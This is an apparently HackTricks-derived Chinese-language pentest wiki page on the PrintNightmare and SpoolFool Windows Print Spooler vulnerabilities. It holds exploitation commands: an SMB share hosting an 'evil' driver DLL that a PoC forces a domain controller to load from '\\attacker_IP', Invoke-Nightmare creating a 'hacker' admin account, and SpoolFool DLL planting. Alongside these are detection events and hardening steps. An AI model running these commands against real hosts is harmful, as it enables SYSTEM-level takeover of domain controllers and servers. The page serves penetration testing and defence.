# PrintNightmare（Windows Print Spooler RCE/LPE）

{{#include ../../banners/hacktricks-training.md}}

> PrintNightmare 是 Windows **Print Spooler** 服务中一系列漏洞的统称，这些漏洞可实现以 **SYSTEM 身份执行任意代码**；当 spooler 可通过 RPC 访问时，还可在域控制器和文件服务器上实现 **远程代码执行（RCE）**。遭到最广泛利用的 CVE 是 **CVE-2021-1675**（最初被归类为 LPE）和 **CVE-2021-34527**（完整 RCE）。后续出现的 **CVE-2021-34481（“Point & Print”）** 和 **CVE-2022-21999（“SpoolFool”）** 等问题表明，攻击面仍远未封闭。

如果你要寻找的是通过 spooler 实现 **身份验证强制 / 中继**，而不是基于 **driver 的 RCE/LPE**，请查看[这个关于打印机强制滥用的页面](printers-spooler-service-abuse.md)。本页面重点介绍如何以 SYSTEM 身份**加载 drivers / DLLs**。

---

## 1. 易受攻击的组件和 CVE

| 年份 | CVE | 简称 | 利用方式 | 备注 |
|------|-----|------------|-----------|-------|
|2021|CVE-2021-1675|“PrintNightmare #1”|LPE|已在 2021 年 6 月的 CU 中修补，但被 CVE-2021-34527 绕过|
|2021|CVE-2021-34527|“PrintNightmare”|RCE/LPE|`AddPrinterDriverEx` 允许经过身份验证的用户从远程共享加载 driver DLL；2021 年 8 月之后，通常需要弱化 Point & Print 策略|
|2021|CVE-2021-34481|“Point & Print”|LPE|非管理员用户可安装未签名的 driver|
|2022|CVE-2022-21999|“SpoolFool”|LPE|可创建任意目录 → DLL planting – 在 2021 年的补丁之后仍然有效|

以上漏洞都滥用了 **MS-RPRN / MS-PAR RPC methods**（`RpcAddPrinterDriver`、`RpcAddPrinterDriverEx`、`RpcAsyncAddPrinterDriver`）之一，或利用了 **Point & Print** 内部的信任关系。

## 2. 利用技术

### 2.1 远程攻陷域控制器（CVE-2021-34527）

经过身份验证但**无特权**的域用户可以在远程 spooler（通常是 DC）上以 **NT AUTHORITY\SYSTEM** 身份运行任意 DLL，方法如下：

```powershell
# 1. Host malicious driver DLL on a share the victim can reach
impacket-smbserver share ./evil_driver/ -smb2support

# 2. Use a PoC to call RpcAddPrinterDriverEx
python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
       -f \
       '\\attacker_IP\share\evil.dll'
```

常见的 PoC 包括 **CVE-2021-1675.py**（Python/Impacket）、**SharpPrintNightmare.exe**（C#），以及 Benjamin Delpy 在 **mimikatz** 中的 `misc::printnightmare / lsa::addsid` 模块。

### 2.2 本地权限提升（任何受支持的 Windows 版本，2021-2024）

同一个 API 也可以在**本地**调用，从 `C:\Windows\System32\spool\drivers\x64\3\` 加载驱动程序并获取 SYSTEM 权限：

```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
```

### 2.3 已修补主机上的现代分诊

在完全更新的主机上，公开的 PrintNightmare PoC 往往会失败，因为 Windows 现在默认仅允许**管理员**安装打印机驱动程序（自 2021 年 8 月 10 日起，`RestrictDriverInstallationToAdministrators=1`）。在对目标发起 exploit 之前，先检查环境是否为支持旧版打印机部署而回滚了这项安全更改：<sup>[[3]](#references)</sup>

```cmd
reg query "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
```

通常最值得关注的两个弱配置值是：<sup>[[3]](#references)</sup>

- `RestrictDriverInstallationToAdministrators = 0`
- `NoWarningNoElevationOnInstall = 1`

在 Linux 上，运行 PoC 之前，先快速确认目标是否暴露了相关的 print RPC 接口：

```bash
rpcdump.py @TARGET | egrep 'MS-RPRN|MS-PAR'
```

一些较新的公开工具还提供了更安全的 **检查/列出** 工作流，让你在发送 DLL 之前先进行检查：

```bash
python3 printnightmare.py -check 'DOMAIN/user:Password@TARGET'
python3 printnightmare.py -list  'DOMAIN/user:Password@TARGET'
```

> 如果低权限用户收到 `RPC_E_ACCESS_DENIED` (`0x8001011b`)，通常说明遇到的是 2021 年之后的默认设置，而不是传输故障。

> 在 Windows 11 22H2+ 及更新的客户端版本中，远程打印默认使用 **RPC over TCP**，并且会禁用 **RPC over named pipes**（`\PIPE\spoolss`），除非显式重新启用。某些较旧的 PoC 和实验室笔记仍假设命名管道可访问。<sup>[[4]](#references)</sup>

### 2.4 在“已修补”的网络中滥用 Package Point & Print

许多企业环境在 2021 年的初始补丁发布后，仍因策略设置而**容易受到攻击**，因为帮助台或打印服务器工作流仍要求非管理员用户安装/更新驱动程序。实际上，攻击方案变为：

- 如果安全提示已完全禁用，**传统的任意 DLL PrintNightmare** 仍是最直接的路径。
- 如果启用了 `Only use Package Point and Print`，通常需要转向**签名的、支持 package-aware 的驱动程序**路径，而不是直接放置原始 DLL。<sup>[[3]](#references)</sup>
- 2024 年的研究表明，**`Package Point and Print - Approved servers` 本身并不是严格的信任边界**：如果攻击者能伪造或劫持某个获准打印服务器的名称解析，受害者仍可能被重定向到符合策略检查的恶意服务器。<sup>[[4]](#references)</sup>
- 即使将 UNC 强化与强制使用 RPC-over-SMB 结合起来，也可能不可靠，因为现代客户端可能会**回退到 RPC over TCP**。<sup>[[4]](#references)</sup>

因此，现代 PrintNightmare 风格的利用通常更侧重于**滥用企业打印机部署策略**，而不是原样重放 2021 年最初的 PoC。

### 2.5 SpoolFool (CVE-2022-21999) – 绕过 2021 年的修复

Microsoft 在 2021 年发布的补丁阻止了远程驱动程序加载，但**没有强化目录权限**。SpoolFool 滥用 `SpoolDirectory` 参数，在 `C:\Windows\System32\spool\drivers\` 下创建任意目录，放入 payload DLL，并强制 spooler 加载它：<sup>[[2]](#references)</sup>

```powershell
# Binary version (local exploit)
SpoolFool.exe -dll add_user.dll

# PowerShell wrapper
Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
```

> 该 exploit 可在安装了最新补丁的 Windows 7 → Windows 11 和 Server 2012R2 → 2022 上生效，适用于 2022 年 2 月更新发布之前的系统<sup>[[2]](#references)</sup>

---

## 3. 检测与 hunting

* **PrintService 日志** – 启用 *Microsoft-Windows-PrintService/Operational* 通道，并监视 **Event ID 316**（添加/更新驱动程序，通常包含 DLL 名称），以检测成功和失败的尝试。结合 **Event ID 808/811**，查找可疑的 spooler 模块/驱动程序加载失败。
* **Sysmon** – 当父进程为 **spoolsv.exe** 时，监视 `C:\Windows\System32\spool\drivers\*` 中的 `Event ID 7`（映像加载）或 `11/23`（文件写入/删除）。
* **进程沿袭** – 每当 **spoolsv.exe** 启动 `cmd.exe`、`rundll32.exe`、PowerShell 或任何意外的未签名子进程时发出警报。
* **网络遥测** – `spoolsv.exe` 意外从攻击者控制的共享中获取 SMB 文件，或本不应作为打印服务器的服务器产生异常打印机 RPC 流量，都是高信号线索。

## 4. 缓解与加固

1. **打补丁！** – 在安装了 Print Spooler 服务的每台 Windows 主机上安装最新的累积更新。
2. **在不需要 spooler 的地方禁用它**，尤其是在域控制器上：
   ```powershell
   Stop-Service Spooler -Force
   Set-Service Spooler -StartupType Disabled
   ```
3. **阻止远程连接**，同时仍允许本地打印 —— Group Policy：`Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`。
4. **将 Point & Print 限制为仅管理员可用**，设置：
   ```cmd
   reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
           /v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
   ```
   Microsoft KB5005652 中的详细指南<sup>[[1]](#references)</sup>
5. 如果业务需求迫使你将 `RestrictDriverInstallationToAdministrators=0`，则应将其他所有打印机策略都视为**仅能提供部分缓解**。至少应优先使用**感知包的驱动程序**，启用 **Only use Package Point and Print**，并将 **Package Point and Print - Approved servers** 限制为明确指定的林内打印服务器。<sup>[[3]](#references)</sup>
6. **不要为了修复失效的打印机映射而回退打印机 RPC 隐私设置**。将 `RpcAuthnLevelPrivacyEnabled=0` 的环境撤销了为应对 **CVE-2021-1678** 而添加的强化措施，在参与安全评估时通常值得对此进行额外审查。<sup>[[4]](#references)</sup>

---

## 5. 相关研究 / 工具

* [mimikatz `printnightmare`](https://github.com/gentilkiwi/mimikatz/tree/master/modules) 模块
* [`ly4k/PrintNightmare`](https://github.com/ly4k/PrintNightmare) – 标准 Impacket 实现，支持 `-check`、`-list` 和 `-delete` 模式
* [`m8sec/CVE-2021-34527`](https://github.com/m8sec/CVE-2021-34527) – 封装工具，内置 SMB 投递、支持多个目标，并支持 `MS-RPRN` / `MS-PAR` 两种模式
* SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)
* [`Concealed Position`](https://github.com/jacob-baines/concealed_position) – 通过 package Point & Print 滥用自带的易受攻击打印机驱动程序
* SpoolFool exploit 与分析文章
* 针对 SpoolFool 和其他 spooler 漏洞的 0patch 微补丁

如果你想通过 spooler **强制触发身份验证**，而不是加载驱动程序，请参阅[打印机后台处理程序服务滥用](printers-spooler-service-abuse.md)。

---

## References

- [1] [Microsoft – KB5005652：管理新的 Point & Print 默认驱动程序安装行为](https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872)
- [2] [Oliver Lyak – SpoolFool：CVE-2022-21999](https://github.com/ly4k/SpoolFool)
- [3] [itm4n – 2024 年 PrintNightmare 实用指南](https://itm4n.github.io/printnightmare-exploitation/)
- [4] [itm4n – PrintNightmare 尚未结束](https://itm4n.github.io/printnightmare-not-over/)
{{#include ../../banners/hacktricks-training.md}}
